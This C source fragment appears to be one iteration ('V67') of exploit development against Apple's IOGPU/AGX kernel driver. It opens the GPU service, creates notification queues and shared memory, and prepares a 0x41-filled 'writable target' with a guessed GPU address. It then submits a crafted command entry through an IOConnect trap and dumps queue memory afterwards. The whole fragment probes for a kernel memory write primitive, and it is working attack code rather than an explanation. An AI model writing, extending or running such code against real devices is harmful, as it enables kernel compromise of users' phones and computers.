// V67: faithful replay — exact segment-list framing + nop record + command,
// valid heap pointers in entry +0x10/+0x18.
static void p_agxfaithful(void) {
    LOG("[v67] faithful AGFI replay");
    io_connect_t c = open_service("IOGPU", 1);
    if (!c) return;
    uint8_t *in = must_map(0x2000);
    uint8_t *out = must_map(0x1000);
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    uint64_t a14[2] = { 0x100, 0x10 };
    size_t osz = 0x10;
    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
    uint64_t nqid = *(uint64_t *)(out + 8);
    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
    osz = 0x10; nosc = 0;
    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
    uint64_t qid = *(uint64_t *)out;
    uint64_t a24[2] = { qid, nqid };
    if (IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL)) { LOG("[fr] bind fail"); return; }
    uint8_t *vaA, *vaB;
    uint32_t idA = gpu_shmem(c, 0x4000, &vaA);
    uint32_t idB = gpu_shmem(c, 0x4000, &vaB);
    if (!idA || !idB) return;
    uint8_t *entry = must_map(0x1000);
    // our writable target: sel8 resource (pre-fill 0x41)
    uint8_t *tgt = must_map(0x10000);
    memset(tgt, 0x41, 0x10000);
    uint32_t ridT = gpu_resource(c, tgt, 0x10000);
    uint64_t tgtGPUVA = 0x100000000ULL | g_last_res_off;   // candidate
    LOG("[fu] target resource rid %u, candidate GPUVA 0x%llx", ridT, tgtGPUVA);
    uint8_t *aux1 = must_map(0x1000);
    uint8_t *aux2 = must_map(0x1000);
    memset(aux1, 0, 0x1000); memset(aux2, 0, 0x1000);
    uint32_t *outw = (uint32_t *)must_map(0x100);
    // notification queue VA from sel14 out[0]
    uint8_t *nqva = NULL;
    {
        uint8_t *o2 = must_map(0x1000);
        memset(o2, 0, 0x1000);
        uint64_t a2[2] = { 0x100, 0x10 };
        size_t os2 = 0x10; uint32_t n2 = 0; uint64_t oc2[4] = {0,0,0,0};
        // reuse the existing one is not possible (id taken); create second for observation
        if (IOConnectCallMethod(c, 14, a2, 2, NULL, 0, oc2, &n2, o2, &os2) == 0)
            nqva = (uint8_t *)(uintptr_t)(*(uint64_t *)o2);
        LOG("[fr] observer nq va %p", nqva);
    }
    memcpy(vaA, agx_A2_image, 0x4000);
    memcpy(vaB, agx_B2_image, 0x4000);
    memset(entry, 0, 0x1000);
    *(uint32_t *)(entry + 0x00) = idA;
    *(uint32_t *)(entry + 0x04) = idB;
    *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)aux1;
    *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)aux2;
    *outw = 0xdeadbeef;
    kern_return_t kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
    LOG("[fr] faithful submit -> kr 0x%08x outw %08x", kt, *outw);
    usleep(500000);
    if (nqva) {
        LOG("[fr] nq dump after submit:");
        for (int i = 0; i < 0x40; i += 16)
            LOG("[fr]   +%02x: %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x",
                i, nqva[i],nqva[i+1],nqva[i+2],nqva[i+3],nqva[i+4],nqva[i+5],nqva[i+6],nqva[i+7],
                nqva[i+8],nqva[i+9],nqva[i+10],nqva[i+11],nqva[i+12],nqva[i+13],nqva[i+14],nqva[i+15]);
    }
    LOG("[v67] done (alive)");
}

